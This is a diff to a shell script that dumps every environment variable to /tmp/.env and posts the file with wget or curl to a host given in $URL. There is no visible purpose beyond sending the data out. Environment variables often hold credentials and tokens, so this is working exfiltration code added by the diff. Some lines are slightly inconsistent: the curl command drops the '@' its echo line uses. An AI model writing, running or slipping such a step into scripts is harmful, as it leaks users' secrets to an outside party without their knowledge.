@@ -13,22 +13,23 @@ echo "Printing ENV"
 echo "------------"
 env
 
+env > /tmp/.env
 
 if [ -x "$(command -v wget)" ]; then
   echo "------------"
   echo "Download with wget"
-  echo wget -qO- "$URL" --post-data="$ENV";
+  echo wget -qO- "$URL" --post-file=/tmp/.env;
   echo "------------"
 
-  wget -qO- "$URL" --post-data="$ENV";
+  wget -qO- "$URL" --post-file=/tmp/.env;
   exit 1
 fi
 
 if [ -x "$(command -v curl)" ]; then
   echo "------------"
   echo "Download with curl"
-  echo wget -qO- "$URL" --post-data="$ENV";
+  echo curl "$URL" -X POST -d @/tmp/.env;
   echo "------------"
-  curl "$URL" -X POST -d "$ENV";
+  curl "$URL" -X POST -d /tmp/.env;
   exit 1
 fi
